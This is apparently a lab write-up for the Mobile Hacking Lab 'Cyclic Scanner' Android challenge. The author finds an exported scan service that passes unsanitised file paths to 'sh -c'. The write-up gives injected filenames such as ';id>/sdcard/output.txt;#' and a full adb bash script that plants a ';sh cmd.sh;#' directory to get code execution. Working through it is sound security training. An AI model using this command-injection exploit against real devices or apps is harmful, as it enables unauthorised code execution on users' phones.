---
description: >-
  https://www.mobilehackinglab.com/path-player?courseid=lab-cyclic-scanner&unit=6606a95991b0d69cf906f66fUnit
---

# Cyclic Scanner

#### Objective <a href="#el_1700338310850_408" id="el_1700338310850_408"></a>

* Exploit a vulnerability inherent within an Android service to achieve remote code execution.

#### Skills Required <a href="#el_1700338310848_406" id="el_1700338310848_406"></a>

* Mastery in reverse engineering Android applications.
* In-depth understanding of Android application architecture, especially Android services, and their inherent vulnerabilities.

#### Tools Needed <a href="#el_1700338310847_404" id="el_1700338310847_404"></a>

* _**Lab Environment**: Provided exclusively for this services exploitation challenge._
* _**Reverse Engineering Tools**: Crucial for code review; use tools like Jadx, APKtool, etc._

#### Inherent Vulnerability in Android Service <a href="#el_1700338310844_401" id="el_1700338310844_401"></a>

* **Description and Impact**: A specific vulnerability found within an Android service used by the application, which can be exploited to execute code remotely.
* **Exploitation Method**: By manipulating the vulnerable Android service’s functionalities, the vulnerability can be activated.

#### Methodology <a href="#el_1711721639062_401" id="el_1711721639062_401"></a>

1. Utilize reverse engineering tools to dissect the application's code, focusing on how it implements Android services.
2. Identify the vulnerability within the Android service and develop a strategy for its exploitation.
3. Craft a malicious payload that is specifically designed to leverage the identified vulnerability within the Android service.
4. Deploy the payload to achieve execution of the code on the device that runs the vulnerable application.

#### Hints <a href="#el_1709310352032_548" id="el_1709310352032_548"></a>

* Investigate the application’s use of Android services for clues on potential vulnerabilities.
* Concentrate on the service’s data processing and interaction patterns for exploitation opportunities.
* Experiment with various payloads and execution techniques to determine the most effective approach.

#### Learning Outcomes <a href="#el_1700338310829_384" id="el_1700338310829_384"></a>

* Enhanced skills in identifying and exploiting vulnerabilities specific to Android services within applications.
* Experience in formulating and implementing remote code execution strategies in a safe and controlled environment.

***

Fristly i will chek the android:exported="true"

<figure><img src="../../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

And we can see EXTERNAL STORAGE

<figure><img src="../../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

And we can see the SCAN SERVICE&#x20;

<figure><img src="../../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

I will inspect more in side of it -->

<figure><img src="../../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

LOOK THAT! Exist a SCAN ENGINE -->

<figure><img src="../../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Public boolean scanfile{}....  `String command = "toybox sha1sum " + file.getAbsolutePath();`\
`Process process = new ProcessBuilder().command("sh", "-c", command)...start();`

> Concatena el path del archivo directamente en un comando de shell sin sanitizar nada, y lo ejecuta con sh -c.

This means that we can set a filename like `;id>/sdcard/output.txt;#` and the sequence be -->

1. toybox sha1sum /sdcard/ ⇒ error
2. id > /sdcard/output.txt ⇒ execute

And the we can read this result because the apk has external extorage: `adb shell "cat /sdcard/pwned.txt"`

Lets do a script -->

```bash
#!/bin/bash

ADB="adb -H 172.19.0.1 -P 5037"  ## ADB connection to Android device via WSL2
OUTPUT="/sdcard/pwned.txt"         ## File where RCE output will be written
SCRIPT="cmd.sh"                    ## Payload script name (relative, cwd = /sdcard/)
INJECT_DIR="/sdcard/;sh cmd.sh;#" ## Directory whose name triggers the injection
DUMMY_FILE="$INJECT_DIR/a"        ## Dummy file inside — ScanService only scans files

echo "!!! Clean..."
$ADB shell "rm -f '$OUTPUT' '/sdcard/$SCRIPT'" 2>/dev/null
$ADB shell "rm -rf '$INJECT_DIR'" 2>/dev/null

echo "+++ Write payload script to /sdcard/cmd.sh..." ## Script content uses '>' for redirection — this is fine inside a FILE
$ADB shell "echo 'id > /sdcard/pwned.txt' > /sdcard/$SCRIPT"

echo "+++ Create malicious directory..." ## Directory name = ';sh cmd.sh;#' — no '>' or '/' so FUSE allows it
$ADB shell "mkdir '$INJECT_DIR'"

echo "+++ Create dummy file inside injected directory..." ## ScanService does isFile() check, so... we need a real file inside the directory
$ADB shell "touch '$DUMMY_FILE'"

echo "@@@ WAIT 8s for scanner cycle..."
sleep 8

echo "*** Read Results..."
RESULT=$($ADB shell "cat '$OUTPUT'" 2>/dev/null)

if [ -n "$RESULT" ]; then
    echo ""
    echo "XXX RCE!"
    echo "    $RESULT"
else
    echo "--- NOTHING... :c CHECK APP..."
fi

echo ""
echo "!!! Clean..."
$ADB shell "rm -rf '$INJECT_DIR' '$OUTPUT' '/sdcard/$SCRIPT'" 2>/dev/null
```

<figure><img src="../../../../../.gitbook/assets/image (1486).png" alt=""><figcaption></figcaption></figure>
